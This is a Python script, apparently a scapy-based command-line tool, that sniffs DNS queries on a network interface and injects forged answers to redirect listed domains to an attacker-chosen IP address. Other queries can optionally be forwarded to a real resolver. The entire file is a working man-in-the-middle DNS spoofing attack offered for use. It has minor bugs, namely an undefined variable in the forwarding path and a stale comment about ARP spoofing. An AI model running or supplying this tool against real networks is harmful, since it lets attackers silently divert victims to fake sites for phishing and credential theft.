
import argparse
import os

from scapy.all import *
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def load_spoof_list(filename):
    with open(filename, 'r') as f:
        return set(line.strip() for line in f if line.strip())

class DnsSpoofer:

    def __init__(self, mode, fake_ip, real_dns_server, spoof_list, forwarding_enabled):
        self.mode = mode
        self.fake_ip = fake_ip
        self.real_dns_server = real_dns_server
        self.spoof_list = spoof_list
        self.forwarding_enabled = forwarding_enabled

    def should_spoof(self, domain):
        if self.mode == "whitelist":
            return domain in self.spoof_list
        elif self.mode == "blacklist":
            return domain not in self.spoof_list
        return False

    def forward_dns(self, original_pkt):
        try:
            query = original_pkt[DNS].qd
            forward_pkt = IP(dst=real_dns_server)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=query)
            reply = sr1(forward_pkt, verbose=0, timeout=2)
            if reply:
                print(f"[→] Forwarded response from real DNS for {query.qname.decode().strip('.')}")
                ip = IP(dst=original_pkt[IP].src, src=original_pkt[IP].dst)
                udp = UDP(dport=original_pkt[UDP].sport, sport=53)
                spoofed = ip/udp/reply[DNS]
                send(spoofed, verbose=0)
        except Exception as e:
            print(f"[!] Error forwarding: {e}")

    def spoof_dns(self, pkt):
        if not pkt.haslayer(DNSQR):
            return

        qname = pkt[DNSQR].qname.decode().strip('.')

        if self.should_spoof(qname):
            print(f"[+] Spoofing {qname} → {self.fake_ip}")
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            dns = DNS(
                id=pkt[DNS].id,
                qr=1, aa=1, qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=60, rdata=self.fake_ip)
            )
            spoofed_pkt = ip/udp/dns
            send(spoofed_pkt, verbose=0)
        elif self.forwarding_enabled:
            print(f"[+] Forward query for {qname}")
            self.forward_dns(pkt)
        else:
            print(f"[-] Ignoring query for {qname}")

    def run(self):
        # Starts the ARP spoofing attack by continuously sending spoofed packets.
        # Restores ARP tables upon interruption (CTRL+C).
        try:
            print("[*] Starting DNS spoofing...")
            sniff(filter="udp port 53", iface=args.interface, store=0, prn=self.spoof_dns)
        except KeyboardInterrupt:
            print(Fore.RED + "[!] Detected CTRL+C. Finish spoofing")

if __name__ == "__main__":
    # Setting up argparse for command-line arguments
    parser = argparse.ArgumentParser(description="Selective DNS Spoofer with Whitelist/Blacklist Modes")
    parser.add_argument("-d", "--dns_server", required=True, help="Real DNS server's address.")
    parser.add_argument("-i", "--interface", required=True, help="Interface to sniff on (e.g., eth0)")
    parser.add_argument("-f", "--file", required=True, help="Path to domain list (.txt)")
    parser.add_argument("-m", "--mode", choices=["whitelist", "blacklist"], default="whitelist", help="Spoof mode")
    parser.add_argument("--forward", action="store_true", help="Forward non-spoofed requests to real DNS")
    parser.add_argument("-a", "--address", required=True, help="IP address for spoofing.")

    # Parse the arguments
    args = parser.parse_args()

    # Create an DnsSpoofer object and start the spoofing process
    spoofer = DnsSpoofer(mode=args.mode, forwarding_enabled=args.forward, spoof_list=load_spoof_list(args.file),
                         fake_ip = args.address, real_dns_server=args.dns_server)
    spoofer.run()